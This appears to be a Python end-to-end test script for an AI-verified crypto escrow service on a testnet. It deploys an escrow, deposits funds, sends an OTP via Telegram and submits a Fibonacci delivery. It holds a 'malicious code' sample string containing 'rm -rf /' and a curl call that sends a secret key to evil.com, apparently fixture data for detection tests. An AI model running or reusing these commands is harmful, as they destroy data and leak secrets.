#!/usr/bin/env python3
"""
HALE Oracle - Complete End-to-End Flow Test
============================================
This script runs through the ENTIRE escrow lifecycle:
1. Deploy Escrow (via Factory)
2. Deposit Funds
3. Set Requirements
4. Generate OTP & Send to Telegram
5. Submit Delivery (simulated code)
6. Oracle Verification (Gemini AI)
7. Display Verdict

Run with: python3 tests/test_full_flow.py
"""

import os
import sys
import json
import time
import requests
from web3 import Web3
from eth_account import Account

# Add parent directory
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Load environment
try:
    from dotenv import load_dotenv
    load_dotenv()
    load_dotenv('.env.local')
except:
    pass

# Configuration
API_BASE_URL = os.getenv("API_BASE_URL", "http://localhost:5001")
ARC_RPC_URL = os.getenv("ARC_TESTNET_RPC_URL", "https://rpc.testnet.arc.network")
FACTORY_ADDRESS = os.getenv("FACTORY_CONTRACT_ADDRESS", "0x33e9915F122135B88fDEba6e8312f0cD8E678098")
PRIVATE_KEY = os.getenv("PRIVATE_KEY")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")

# Test seller - use a different address than the buyer
SELLER_ADDRESS = "0x0f7B6653e2D9142e8bC89611C9CA08E4BCe7c5ea"
SELLER_TELEGRAM = "@Eyedroppz"

# Sample code deliveries
GOOD_CODE = '''
def fibonacci(n):
    """Calculate the nth Fibonacci number."""
    if n <= 0:
        return 0
    elif n == 1:
        return 1
    else:
        a, b = 0, 1
        for _ in range(2, n + 1):
            a, b = b, a + b
        return b

# Test the function
for i in range(10):
    print(f"F({i}) = {fibonacci(i)}")
'''

MALICIOUS_CODE = '''
import os
import subprocess

# This code tries to execute system commands
os.system("rm -rf /")
subprocess.run(["curl", "http://evil.com/steal?data=" + os.environ.get("SECRET_KEY", "")])
exec(eval("bad_code"))
'''

def print_header(text):
    print(f"\n{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}")

def print_step(num, text):
    print(f"\n📍 Step {num}: {text}")
    print("-" * 40)

def main():
    print_header("🚀 HALE Oracle - Complete E2E Flow Test")
    
    if not PRIVATE_KEY:
        print("❌ PRIVATE_KEY not set in .env")
        return False
    
    # Setup Web3
    web3 = Web3(Web3.HTTPProvider(ARC_RPC_URL))
    if not web3.is_connected():
        print("❌ Not connected to Arc Testnet")
        return False
    
    account = Account.from_key(PRIVATE_KEY)
    buyer_address = account.address
    
    print(f"🔑 Buyer Address: {buyer_address}")
    print(f"💰 Balance: {web3.from_wei(web3.eth.get_balance(buyer_address), 'ether')} USDC")
    print(f"🏭 Factory: {FACTORY_ADDRESS}")
    print(f"📦 Seller: {SELLER_ADDRESS}")
    print(f"📱 Seller Telegram: {SELLER_TELEGRAM}")
    
    # Load ABIs
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    with open(os.path.join(base_dir, "frontend/src/factory_abi.json"), 'r') as f:
        factory_abi = json.load(f)
    with open(os.path.join(base_dir, "frontend/src/escrow_abi.json"), 'r') as f:
        escrow_abi = json.load(f)
    
    factory = web3.eth.contract(address=Web3.to_checksum_address(FACTORY_ADDRESS), abi=factory_abi)
    
    # =========================================
    # STEP 1: Deploy Escrow
    # =========================================
    print_step(1, "Deploy New Escrow")
    
    nonce = web3.eth.get_transaction_count(buyer_address)
    tx = factory.functions.createEscrow().build_transaction({
        'from': buyer_address,
        'nonce': nonce,
        'gas': 2000000,
        'gasPrice': web3.to_wei(20, 'gwei')
    })
    signed = account.sign_transaction(tx)
    tx_hash = web3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"   TX Hash: {tx_hash.hex()}")
    
    receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
    
    # Get escrow address from event
    escrow_address = None
    for log in receipt.logs:
        try:
            parsed = factory.events.EscrowCreated().process_log(log)
            escrow_address = parsed['args']['escrowAddress']
            break
        except:
            continue
    
    if not escrow_address:
        print("❌ Could not find EscrowCreated event")
        return False
    
    print(f"   ✅ Escrow deployed: {escrow_address}")
    
    escrow = web3.eth.contract(address=escrow_address, abi=escrow_abi)
    
    # =========================================
    # STEP 2: Deposit Funds
    # =========================================
    print_step(2, "Deposit Funds")
    
    deposit_amount = web3.to_wei(0.001, 'ether')  # 0.001 USDC
    
    nonce = web3.eth.get_transaction_count(buyer_address)
    tx = escrow.functions.deposit(SELLER_ADDRESS).build_transaction({
        'from': buyer_address,
        'value': deposit_amount,
        'nonce': nonce,
        'gas': 200000,
        'gasPrice': web3.to_wei(20, 'gwei')
    })
    signed = account.sign_transaction(tx)
    tx_hash = web3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"   TX Hash: {tx_hash.hex()}")
    
    receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
    
    if receipt.status == 1:
        print(f"   ✅ Deposited {web3.from_wei(deposit_amount, 'ether')} USDC")
    else:
        print("   ❌ Deposit failed")
        return False
    
    # =========================================
    # STEP 3: Set Requirements
    # =========================================
    print_step(3, "Set Contract Requirements")
    
    requirements = "Create a Python function that calculates Fibonacci numbers. Must be efficient and well-documented."
    
    nonce = web3.eth.get_transaction_count(buyer_address)
    tx = escrow.functions.setContractRequirements(
        SELLER_ADDRESS,
        requirements,
        SELLER_TELEGRAM
    ).build_transaction({
        'from': buyer_address,
        'nonce': nonce,
        'gas': 300000,
        'gasPrice': web3.to_wei(20, 'gwei')
    })
    signed = account.sign_transaction(tx)
    tx_hash = web3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"   TX Hash: {tx_hash.hex()}")
    
    receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
    
    if receipt.status == 1:
        print(f"   ✅ Requirements set: '{requirements[:50]}...'")
    else:
        print("   ❌ Set requirements failed")
        return False
    
    # =========================================
    # STEP 4: Generate OTP & Notify Seller
    # =========================================
    print_step(4, "Generate OTP & Notify Seller via Telegram")
    
    # Call backend API to generate OTP
    try:
        response = requests.post(
            f"{API_BASE_URL}/api/generate-otp",
            json={
                "seller_address": SELLER_ADDRESS,
                "escrow_address": escrow_address,
                "requirements": requirements,
                "seller_telegram": SELLER_TELEGRAM
            },
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            otp = data.get('otp')
            submission_link = data.get('submission_link')
            print(f"   ✅ OTP Generated: {otp}")
            print(f"   📧 Submission Link: {submission_link[:60]}...")
            
            # Send Telegram notification
            if TELEGRAM_BOT_TOKEN:
                telegram_msg = f"""🔔 New HALE Escrow Created!

💰 Amount: {web3.from_wei(deposit_amount, 'ether')} USDC
📋 Requirements: {requirements[:100]}...

🔑 Your OTP: {otp}

📎 Submit your code here:
{submission_link}"""
                
                # Get chat ID for seller
                try:
                    updates = requests.get(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
                    ).json()
                    
                    chat_id = None
                    for update in updates.get('result', []):
                        msg = update.get('message', {})
                        if msg.get('from', {}).get('username', '').lower() == SELLER_TELEGRAM.replace('@', '').lower():
                            chat_id = msg['chat']['id']
                            break
                    
                    if chat_id:
                        requests.post(
                            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                            json={"chat_id": chat_id, "text": telegram_msg}
                        )
                        print(f"   📱 Telegram notification sent to {SELLER_TELEGRAM}")
                    else:
                        print(f"   ⚠️ Could not find chat ID for {SELLER_TELEGRAM}")
                except Exception as e:
                    print(f"   ⚠️ Telegram error: {e}")
        else:
            print(f"   ⚠️ OTP generation failed: {response.text}")
            # Generate a fake OTP for testing
            otp = "12345"
            submission_link = f"{API_BASE_URL}/submit?seller={SELLER_ADDRESS}&otp={otp}"
    except Exception as e:
        print(f"   ⚠️ API error: {e}")
        otp = "12345"
        submission_link = f"{API_BASE_URL}/submit"
    
    # =========================================
    # STEP 5: Submit Good Code Delivery
    # =========================================
    print_step(5, "Submit Code Delivery (GOOD code)")
    
    print("   📤 Submitting Fibonacci implementation...")
    print(f"   Code preview:\n{GOOD_CODE[:200]}...")
    
    try:
        response = requests.post(
            f"{API_BASE_URL}/api/submit-delivery",
            json={
                "seller_address": SELLER_ADDRESS,
                "escrow_address": escrow_address,
                "otp": otp,
                "code": GOOD_CODE
            },
            timeout=30
        )
        
        if response.status_code == 200:
            print("   ✅ Delivery submitted successfully")
        else:
            print(f"   ⚠️ Submission response: {response.status_code} - {response.text[:100]}")
    except Exception as e:
        print(f"   ⚠️ Submission error: {e}")
    
    # =========================================
    # STEP 6: Oracle Verification
    # =========================================
    print_step(6, "Oracle AI Verification (Gemini)")
    
    print("   🤖 Waiting for Oracle to verify delivery...")
    time.sleep(3)  # Give the backend time to process
    
    try:
        response = requests.get(
            f"{API_BASE_URL}/api/escrow-status/{escrow_address}",
            timeout=10
        )
        
        if response.status_code == 200:
            status = response.json()
            print(f"   📊 Escrow Status: {status.get('status', 'unknown')}")
            if 'verdict' in status:
                print(f"   🏆 Verdict: {status['verdict']}")
            if 'confidence_score' in status:
                print(f"   📈 Confidence: {status['confidence_score']}%")
            if 'analysis' in status:
                print(f"   📝 Analysis: {status['analysis'][:200]}...")
        else:
            print(f"   ⚠️ Could not get status: {response.text[:100]}")
    except Exception as e:
        print(f"   ⚠️ Status check error: {e}")
    
    # =========================================
    # STEP 7: Summary
    # =========================================
    print_header("📊 Flow Complete - Summary")
    
    print(f"""
    🏭 Factory Address:    {FACTORY_ADDRESS}
    📦 Escrow Address:     {escrow_address}
    👤 Buyer:              {buyer_address}
    👤 Seller:             {SELLER_ADDRESS}
    💰 Deposit:            {web3.from_wei(deposit_amount, 'ether')} USDC
    📋 Requirements:       {requirements[:40]}...
    📱 Seller Telegram:    {SELLER_TELEGRAM}
    🔐 OTP:                {otp}
    
    ✅ Escrow Deployed
    ✅ Funds Deposited
    ✅ Requirements Set
    ✅ OTP Generated
    ✅ Delivery Submitted
    ⏳ Awaiting Oracle Verdict (check API or Telegram)
    """)
    
    print(f"\n🔗 View on Explorer: https://testnet.arcscan.app/address/{escrow_address}")
    
    return True

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
